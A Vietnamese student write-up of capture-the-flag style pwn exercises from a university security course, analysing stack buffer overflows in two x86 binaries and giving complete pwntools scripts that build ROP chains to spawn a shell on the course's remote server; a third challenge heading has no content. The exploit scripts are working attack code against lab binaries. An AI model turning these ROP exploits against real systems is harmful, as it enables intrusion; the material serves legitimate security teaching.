## Welcome đến với deadline của PhaPhaJian !

Đầy là 1 trong những deadline của mình trên trường do anh PhaPhaJian cho mình trên lớp, cũng là 1 dịp để quay lại những kỹ thuật mà mình đã học qua lúc trước 


### rop2
##### [Rop2]https://uithcm-my.sharepoint.com/:u:/g/personal/inseclab_hcmuit_edu_vn/EYd3UU7ocA1DipbNdbG32lkBa8ySQ2GQjnIOB6grKLWaSg?e=uNvgYj() - x86 - ret2text/ret2syscall: nc 45.122.249.68 10006

Đầu tiên chúng ta bước vào 1 thủ tục mà các pwner đều sẽ làm khi gặp 1 bài pwn đó chính là file và checksec để kiểm tra thông tin cung các cơ chế bảo vệ của file : 



Từ thông tin ở trên chúng ta thấy được vài điểm sau : 
  + Là file ELF 32 bit +  statically linked : Các tệp được statically linked được 'locked' với file binary tại thời điểm liên kết để chúng không bao giờ thay đổỉ.
  + Stack Canary found : Option này là cho chúng ta biết rằng cơ chế Canary đã được bật lên
  + NX enabled : Option này là không cho phép thực thi câu lệnh trên stack


Hhmmm đã có thông tin của bài này rồi, thì chúng ta có thể dùng IDA Pro để check flow của nó xem chúng ta khai thác như nào nhé :lau:  

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-Ch]

  setvbuf(stdout, 0, 2, 0);
  v4 = getegid();
  setresgid(v4, v4, v4);
  vuln();
  return 0;
}
```
Xem mã giã chúng ta thấy được bài không có gì bất thường :| cho tới khi gọi hàm vuln
```
int vuln()
{
  char v1[20]; // [esp+0h] [ebp-18h] BYREF

  puts("Can you ROP your way out of this one?");
  return gets(v1);
}
```
 Vào trong hàm Vuln chúng ta có thể thấy được hàm đang gọi hàm gets(s1) với s1 size == 20. Chúng ta có thể thấy được đây chính là lỗi bof nè 
 
Sau khi dùng IDA đi 1 vòng thì ta nhận ra vấn đề như sau : 
  + Lỗ hổng chúng ta khai thác lần này là Bof
  + Không có hàm flag hay hàm /bin/sh nào hết 
  + Offset đầu tiên là 20
  


Dựa vào 2 lần phân tích trên chúng ta có thể đưa ra các hướng exploit như là ret2syscall, ret2text, ROPgadget, ... Tuy nhiên lần này ta sẽ sử dụng ROPgadget cho lẹ nhé Hehe

Đã xác định được hướng đi của mình thì giờ chúng ta sang phần bypass canary và viết ROP, 1 ROP cơ bản như sau : 

Để leak được canary vì là chỉ có statically linked nên canary sẽ không bị thay đổi, nên chúng a có thể mở gdb lên để leak canary như sau : 



Disassemble vuln và đặt breakpoint ở hàm gets, nhập vào 20 ký tự "a".

  

Sử dụng câu lệnh x/100x $esp để show stack frame cho chúng ta quan sát, chúng ta thấy được như sau : 
  + Offset = 20 
  + Canary = 0x080da000
  + Save base pointer = 0xffffd008
Sau đó mới tới phần return address .

Từ đó chúng ta chuyển sang phần viết ROP.
  
```
pop eax ; ret
pop edx ; pop ecx ; pop ebx ; ret
/bin/sh
int80
```


Giờ thì dựa vào đoạn ROP trên chúng ta phải viết ra ROP phù hợp với binnary trên, nên sử dụng câu lệnh sau : 



Tuy nhiên mọi chuyện đâu có dễ dàng như thế, trong pop eax; ret chúng ta có thể thấy 1 byte là 0x0a đây là 1 bad byte đối với hàm gets, vì khi nhận byte này hàm gets sẽ nhận dạng nó là byte xuống dòng và kết thúc cái ROP của chúng ta
Haizz badbyte like badboiz :|


Thế là chúng ta có thể viết 1 cái rop khác không sử dụng pop eax;ret tuy nhiên điều này cần kiến thức về asm khá vững, còn mình thì ...... vừa không vững vừa lười nên mình đã quyết định đi 1 con đường khá táo bạo
sử dụng option bad bytes của tool ROPgadget.

 
 
 Như thế chúng ta đã có được 1 gadget rồi.
 
 Gom 7749 thông tin phân tích được ở trên kia lại thành cái file exploit này nè :D 

```
from pwn import *
from struct import pack


BIN = "./rop2"
 
###ROP  --binary ./rop2 --rop --badbytes "0a"
p = b''

p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += b'/bin'
p += pack('<I', 0x080da060) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += b'//sh'
p += pack('<I', 0x080da064) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x08049563) # int 0x80
canary = 0x080da000
save_base_pointer = 0xffffd008
def exploit():
	payload = b"a"*20 + p32(canary) + p32(save_base_pointer) + p 
#	__breakpoint="""
#		b*0x080488d0
#		"""
#	gdb.attach(io,__breakpoint)
	io.recvuntil("Can you ROP your way out of this one?")
	io.sendline(payload)
	io.interactive()



#io = process(BIN)
io = remote("45.122.249.68",10006)
#context.log_level='debug'
exploit()


```

### ROPchain
##### ROPchain - x86 - ROP chains: nc 45.122.249.68 10002
[ROPchain](https://uithcm-my.sharepoint.com/personal/khoanh_hcmuit_edu_vn/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fkhoanh%5Fhcmuit%5Fedu%5Fvn%2FDocuments%2FTh%E1%BB%B1c%20H%C3%A0nh%2FCO%5FCHE%5FMADOC%2F2021%2FChallenge%2FROPchain&parent=%2Fpersonal%2Fkhoanh%5Fhcmuit%5Fedu%5Fvn%2FDocuments%2FTh%E1%BB%B1c%20H%C3%A0nh%2FCO%5FCHE%5FMADOC%2F2021%2FChallenge)

```
#include <stdio.h>

char shell[] = "/bin/sh";
void SetBuf(){
	setvbuf(stdout,0,_IONBF,0);
	setvbuf(stdin,0,_IONBF,0);
	setvbuf(stderr,0,_IONBF,0);
}
void Vuln(){
	char buf[128];
        puts("Insert ROP chain here:");
        read (0, &buf,0x100);
}
int main(){
	SetBuf();
	puts("Wanna.One");
	puts("Muon gioi phai lam viec kho");
	Vuln();
	return 0;
}

```


Đầy là 2 file source của bài này, tuy nhiên bài này có vẻ dễ hơn bài trên nhiều. Nhưng thủ tục vẫn là thủ tục :3 checksec thôi nàooo


Từ checksec ta thấy được canary đã được bật, same same bài trên nhỉ :D , chứ còn gì nữa nên làm các bước cũng tương tự như trên đi rồi tính tiếp ha

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int savedregs; // [esp+4h] [ebp+0h]

  SetBuf();
  puts();
  savedregs = 134922153;
  puts();
  Vuln();
  return 0;
}
```


```
int Vuln()
{
  char v1[132]; // [esp+0h] [ebp-88h] BYREF

  puts("Insert ROP chain here:");
  return read(0, v1, 256);
}
```
Dựa vào đoạn code trên thì có thể thấy được rằng với v1 chỉ có size là 132 nhưng hàm read lại được max là 256 byte điều đó đã xuất hiện lỗi bof rồi.


Sử dụng gdb để phân tích như sau






Với offset từ IDA Pro chúng ta có thể dùng để xác định stack frame gồm những gì 


Từ đó chúng ta chuyển sang phần viết ROP.
  
```
pop eax ; ret
pop edx ; pop ecx ; pop ebx ; ret
/bin/sh
int80
```


Giờ thì dựa vào đoạn ROP trên chúng ta phải viết ra ROP phù hợp với binnary trên, nên sử dụng câu lệnh sau : 



```
from pwn import *
from struct import pack


BIN = "./ROPchain"
HOST = "45.122.249.68" 
PORT = 10002
canary = 0x080d900a
save_base_pointer = 0xffffcff8





pop_eax = 0x080a89e6 #pop eax ; ret
pop_edx = 0x0806e051 #pop edx ; pop ecx ; pop ebx ; ret
bin_sh = 0x080d9068 #/bin/sh
int80 = 0x080495a3


def exploit():
	payload = b"a"*132 + p32(canary) + p32(save_base_pointer) 
	payload += p32(pop_eax) + p32(0xb)
	payload += p32(pop_edx) + p32(0) + p32(0) + p32(bin_sh)
	payload += p32(int80)
	# __breakpoint="""
	# 	b*main+67
	# 	"""
	# gdb.attach(io,__breakpoint)
	io.recvuntil("Insert ROP chain here:")
	io.sendline(payload)
	io.interactive()

# io = process(BIN)
# context.log_level='debug'
io = remote(HOST,PORT)
exploit()
```


### Return2LibC_Once
##### Return2LibC_Once - x86 - ret2libc: nc 45.122.249.68 10011













